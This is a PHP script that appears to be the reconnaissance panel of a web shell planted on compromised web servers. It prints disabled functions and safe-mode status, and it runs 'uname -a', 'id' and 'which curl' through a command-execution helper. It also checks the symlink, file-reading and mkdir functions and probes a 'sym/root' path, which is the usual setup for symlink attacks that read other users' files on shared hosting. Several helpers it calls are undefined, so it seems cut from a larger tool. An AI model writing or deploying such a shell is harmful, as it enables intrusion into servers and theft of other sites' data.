<?php

echo "<center>";
if(@ini_get("disable_functions")){
 echo "DisablePHP=".@ini_get("disable_functions");
}else{ 
 echo "Disable PHP = None";
 echo "<br>";echo " Kernel = ";echo Execute("uname -a");echo "<br>";
echo Execute("id");}echo "<br>";print "\n";
if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} 
echo "<br>";print "\n";
echo " Curl Support = ";echo Execute("which curl"); echo "<br>";print "\n";


echo "System: <font color=lime>".php_uname()."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "========================================================================================<br>";
echo "IP Server : <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | IP Kamu : <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "========================================================================================";
echo "<div class='tmp'>
<table align='center' width='40%'><td>function</td><td>Case</td>";


$safe_mode = ini_get('safe_mode');
if($safe_mode){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>Safe Mode</td><td>$r</td>";

$fun = function_exists('symlink');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function symlink</td><td>$r</td>";


$fun = function_exists('file');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function file</td><td>$r</td>";

$fun = function_exists('file_get_contents');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function file_get_contents</td><td>$r</td>";

$fun = function_exists('mkdir');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>function mkdir</td><td>$r</td>";


$fun = is_dir('sym/root');
if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}

echo "<tr><td>Permission denied</td><td>$r</td>";


$fun = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));
if($fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #006600'>True</b>";}

echo "<tr><td>Forbidden</td><td>$r</td>";




echo "</table></div><br>";
echo "========================================================================================<br>";
echo getcwd();
echo "<br>========================================================================================";

echo '</center></body></html>';


?>
